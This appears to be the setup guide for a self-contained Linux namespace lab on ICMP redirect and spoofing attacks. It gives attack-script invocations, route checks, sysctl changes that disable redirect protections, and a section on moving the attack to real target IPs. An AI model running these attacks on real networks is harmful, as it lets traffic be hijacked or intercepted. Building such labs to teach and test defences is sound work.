# Complete Local Namespace Lab Setup

## Overview

This lab environment is designed to be **completely self-contained** using Linux network namespaces. No external network connectivity is required - everything runs locally using simulated targets.

## Why Local Testing?

### Benefits of Namespace-Only Lab
- **Complete Isolation**: No external network dependencies
- **Predictable Results**: Controlled environment with known targets  
- **Educational Focus**: Learn concepts without network variables
- **Safe Testing**: No risk of affecting external systems
- **Repeatable**: Same results every time

### Problems with External IPs (like 8.8.8.8)
- **Network Dependencies**: Requires internet connectivity
- **Unpredictable Routing**: External factors affect results
- **Firewall Issues**: Corporate/home firewalls may block traffic
- **Rate Limiting**: External services may rate limit requests
- **Educational Distraction**: Focus shifts from concepts to connectivity

## Test Target Configuration

### RFC 5737 Test Networks (Recommended)
```python
# From lab_config.py
'local_targets': [
    '203.0.113.1',   # TEST-NET-3 (RFC 5737) - Primary test target
    '192.0.2.1',     # TEST-NET-1 (RFC 5737) - Secondary test target
    '10.0.0.1',      # Private network - Simulated external server
    '172.16.0.1',    # Private network - Another simulated target
]
```

### Why These Addresses?
- **RFC 5737 Addresses**: Specifically reserved for documentation and testing
- **Never Routed**: Guaranteed not to exist on the internet
- **Educational Standard**: Widely recognized as test addresses
- **No Conflicts**: Won't interfere with real network infrastructure

## Complete Lab Architecture

```
┌─────────────────────────────────────────┐
│ Host System (192.168.100.1)            │
│ ┌─────────────────────────────────────┐ │
│ │ Victim Namespace                    │ │
│ │ - IP: 192.168.100.2/24             │ │
│ │ - Interface: v-veth                 │ │ 
│ │ - Routes traffic to test targets    │ │
│ └─────────────────────────────────────┘ │
│ ┌─────────────────────────────────────┐ │
│ │ Attacker Namespace                  │ │
│ │ - IP: 192.168.100.3/24             │ │
│ │ - Interface: s-veth                 │ │
│ │ - Sends malicious ICMP redirects    │ │
│ └─────────────────────────────────────┘ │
│ ┌─────────────────────────────────────┐ │
│ │ Simulated External Network          │ │
│ │ - 203.0.113.1 (TEST-NET-3)         │ │
│ │ - 192.0.2.1   (TEST-NET-1)         │ │
│ │ - 10.0.0.1    (Private)            │ │
│ │ - 172.16.0.1  (Private)            │ │
│ └─────────────────────────────────────┘ │
└─────────────────────────────────────────┘
```

## Attack Examples (Updated for Local Targets)

### Basic ICMP Redirect Attack
```bash
# Redirect victim's traffic to TEST-NET-3 through attacker
sudo python3 icmp_redirect_raw.py \
    192.168.100.2 \
    203.0.113.1 \
    192.168.100.1 \
    --fake-gateway 192.168.100.3 \
    --namespace attacker \
    --monitor-namespace victim
```

### Continuous Redirect Attack
```bash
# Sustained attack with monitoring
sudo python3 icmp_redirect_raw.py \
    192.168.100.2 \
    203.0.113.1 \
    192.168.100.1 \
    --fake-gateway 192.168.100.3 \
    --namespace attacker \
    --continuous \
    --duration 60
```

### ICMP Spoofing Test
```bash
# Spoof packets from TEST-NET-1 to victim
sudo python3 icmp_spoofer_raw.py \
    192.168.100.2 \
    --source 192.0.2.1 \
    --namespace attacker \
    --type 8
```

## Verification Commands (Updated)

### Route Monitoring
```bash
# Monitor victim's routes to test targets
sudo ip netns exec victim watch -n 1 'ip route get 203.0.113.1'
sudo ip netns exec victim watch -n 1 'ip route get 192.0.2.1'
```

### Connectivity Testing  
```bash
# Test connectivity to local targets
sudo ip netns exec victim ping -c 3 203.0.113.1
sudo ip netns exec victim ping -c 3 192.0.2.1
sudo ip netns exec victim ping -c 3 10.0.0.1

# Traceroute to verify path
sudo ip netns exec victim traceroute 203.0.113.1
```

### Traffic Capture
```bash
# Monitor for redirected traffic
sudo ip netns exec victim tcpdump -i v-veth dst 203.0.113.1
sudo ip netns exec attacker tcpdump -i s-veth icmp
```

## Expected Results

### Before Attack
```bash
# Route table shows direct path via gateway
203.0.113.1 via 192.168.100.1 dev v-veth src 192.168.100.2
```

### After Successful Attack
```bash
# Route table shows path via attacker
203.0.113.1 via 192.168.100.3 dev v-veth src 192.168.100.2
```

### Traffic Flow
```
Normal:  Victim → Gateway → Target
Attack:  Victim → Attacker → Target (if forwarded)
         Victim → Attacker → Drop (if intercepted)
```

## Lab Scenarios

### Scenario 1: Basic Redirect
- **Target**: 203.0.113.1 (TEST-NET-3)
- **Purpose**: Demonstrate basic ICMP redirect
- **Expected**: Route change to use attacker as gateway

### Scenario 2: Multiple Targets
- **Targets**: 203.0.113.1, 192.0.2.1, 10.0.0.1
- **Purpose**: Show selective route manipulation
- **Expected**: Different routes for different targets

### Scenario 3: Attack Detection
- **Target**: Any test target
- **Purpose**: Demonstrate defense mechanisms
- **Expected**: Attack blocked when defenses enabled

## Key Learning Points

1. **Isolation Benefits**: Lab works without internet
2. **Predictable Results**: Same behavior every time
3. **Educational Focus**: Concepts over connectivity
4. **Real-world Applicable**: Same techniques work on real networks
5. **Safe Experimentation**: No external impact

## Migration to Production

When moving from lab to real-world testing:

1. **Replace test IPs** with actual target IPs
2. **Update network ranges** to match production
3. **Consider firewall rules** for real environments
4. **Account for network topology** differences
5. **Enable proper monitoring** for real traffic

## Troubleshooting

### Traffic Not Redirecting
```bash
# Check if victim accepts redirects
sudo ip netns exec victim sysctl net.ipv4.conf.all.accept_redirects

# Should be 1 for attack to work
sudo ip netns exec victim sysctl -w net.ipv4.conf.all.accept_redirects=1
```

### No Route Changes
```bash
# Check secure redirects setting
sudo ip netns exec victim sysctl net.ipv4.conf.all.secure_redirects

# Should be 0 for attack to work
sudo ip netns exec victim sysctl -w net.ipv4.conf.all.secure_redirects=0
```

### Connectivity Issues
```bash
# Verify namespace connectivity
sudo ip netns exec victim ping 192.168.100.1  # Gateway
sudo ip netns exec victim ping 192.168.100.3  # Attacker

# Check interface status
sudo ip netns exec victim ip link show v-veth
```

---

## Summary

This local namespace lab provides a complete, self-contained environment for learning ICMP attacks without external dependencies. Using RFC 5737 test networks ensures educational standards while maintaining complete isolation from production networks.

The focus remains on understanding attack mechanics, packet crafting, and defense strategies rather than dealing with network connectivity issues. 